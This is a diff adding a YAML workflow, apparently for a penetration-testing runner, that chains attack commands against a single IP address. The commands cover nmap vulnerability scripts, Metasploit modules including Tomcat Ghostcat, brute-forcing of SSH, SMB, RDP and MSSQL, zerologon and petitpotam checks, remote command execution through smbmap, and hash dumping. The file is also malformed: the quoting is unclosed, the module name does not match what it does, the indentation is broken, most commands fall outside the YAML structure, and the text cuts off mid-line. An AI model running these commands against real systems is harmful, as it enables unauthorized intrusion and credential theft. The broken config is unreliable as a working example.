@@ -1,0 +1,69 @@
+vars:
+  IP: "192.1.1.1"
+  OUTPUT_DIR: "network"
+  USAGE: "rayder -w workflow.yaml IP=192.1.1.1 
+
+parallel: false
+
+modules:
+  
+   - name: decompile-apk
+     silent: false
+      cmds:
+      - mkdir -p {{OUTPUT_DIR}}
+      - nmap -p- -sC -sV -oA "$results_dir/nmap_tcp_scan" "$IP"
+      - nmap -p- -sC -sU -oA "$results_dir/nmap_udp_scan" "$IP"
+      - nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP" -oN "$results_dir/ftp.txt"
+      - msfconsole -q -x "use auxiliary/scanner/ftp/anonymous ; spool $results_dir/ftp_msf.txt; set rhosts $IP; set password anonymous; run ;spool off ; exit"
+      - nmap --script ssh-* -p 22 "$IP" | tee "$results_dir/ssh_results"
+      - crackmapexec ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a "$results_dir/ssh_results.txt"
+      - nmap -n --script "*telnet* and safe" -p 23 "$IP"  -oN "$results_dir/telnet.txt"
+      - nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587  "$IP" | tee "$results_dir/smtp.txt"
+      - nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 "$IP" | tee -a "$results_dir/ntp.txt"
+
+impacket-rpcdump -port 135 "$IP" | grep -E 'MS-RPRN|MS-PAR' | tee -a "$results_dir/MSRPC_overall_results.txt"
+impacket-rpcdump -port 135 "$IP" | tee -a "$results_dir/MSRPC_overall_results.txt"
+nmap --script msrpc-enum -p 135 "$IP" | tee -a "$results_dir/MSRPC_overall_results.txt"
+
+rpcclient -U '' -N "$IP" -c enumdomusers | tee "$results_dir/rpc-check.txt"
+rpcclient -U '' -N "$IP" -c querydispinfo | tee -a "$results_dir/rpc-check.txt"
+rpcclient -U '' -N "$IP" -c enumdomains  | tee -a "$results_dir/rpc-check.txt"
+rpcclient -U '' -N "$IP" -c enumdomgroups | tee -a "$results_dir/rpc-check.txt"
+
+nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-protocols,smb-vuln*" -p 445 "$IP" | tee "$results_dir/SMB_overall_results.txt"
+enum4linux -a -v "$IP" | tee -a "$results_dir/SMB_overall_results.txt"
+netexec smb "$IP" -u '' -p '' -M zerologon -M petitpotam | tee -a "$results_dir/SMB_overall_results.txt"
+smbmap -H "$IP" -R | tee -a "$results_dir/SMB_overall_results.txt"
+smbclient -N -L "$results_dir/list_hosts" | tee -a "$results_dir/SMB_overall_results.txt"
+smbmap -u username -p password --host-file "$results_dir/list_hosts" -x 'ipconfig' | tee -a "$results_dir/SMB_overall_results.txt"
+crackmapexec smb "$IP" -u username -p password --users | tee -a "$results_dir/SMB_overall_results.txt"
+crackmapexec smb "$IP" -u users.txt -p password --continue-on-success | tee -a "$results_dir/SMB_overall_results.txt"
+
+nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 "$IP" | tee "$results_dir/LDAP_overall_results.txt"
+netexec ldap "$IP" -u usernames.txt -p '' -k | tee -a "$results_dir/LDAP_overall_results.txt"
+netexec ldap "$IP" -u username -p password --trusted-for-delegation | tee -a "$results_dir/LDAP_overall_results.txt"
+
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 "$IP" | tee "$results_dir/mssql_results.txt"
+crackmapexec mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a "$results_dir/mssql_results.txt"
+
+nmap --script "mysql-info,mysql-enum,mysql-brute,mysql-databases,mysql-users,mysql-*" -p 3306 "$IP" | tee "$results_dir/mysql_results.txt"
+
+nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 "$IP" | tee "$results_dir/apache_ajp_results.txt"
+msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; spool $results_dir/apache_ajp_msf.txt; set rhosts $IP; run ;spool off ; exit"
+
+nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 "$IP" | tee "$results_dir/rdp_results.txt"
+hydra -l username -P passwords.txt "$IP" rdp | tee -a "$results_dir/rdp_results.txt"
+msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner ; spool $results_dir/rdp_nla.txt; set rhosts $IP; run ;spool off ; exit"
+msfconsole -q -x "auxiliary/scanner/rdp/ms12_020_check  ; spool $results_dir/rdp_ms12.txt; set rhosts $IP; run ;spool off ; exit"
+
+nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 "$IP" | tee  "$results_dir/snmp.txt"
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$IP" snmp |  tee -a "$results_dir/snmp.txt"
+snmp-check "$IP" -p 161 -c public | tee -a "$results_dir/snmp.txt"
+msfconsole -q -x "auxiliary/scanner/snmp/snmp_enum; spool $results_dir/rdp_ms12.txt; set rhosts $IP; run ;spool off ; exit"
+
+nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 "$IP" | tee "$results_dir/nfs_results.txt"
+
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' "$IP" | tee  "$results_dir/vnc_results.txt"
+msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; spool $results_dir/vncmsf.txt; set rhosts $IP; run ;spool off ; exit"
+
+nmap -sV --script "docker-*" -p 2375,2376 "$IP"  | tee  "$results_dir/docker_Res
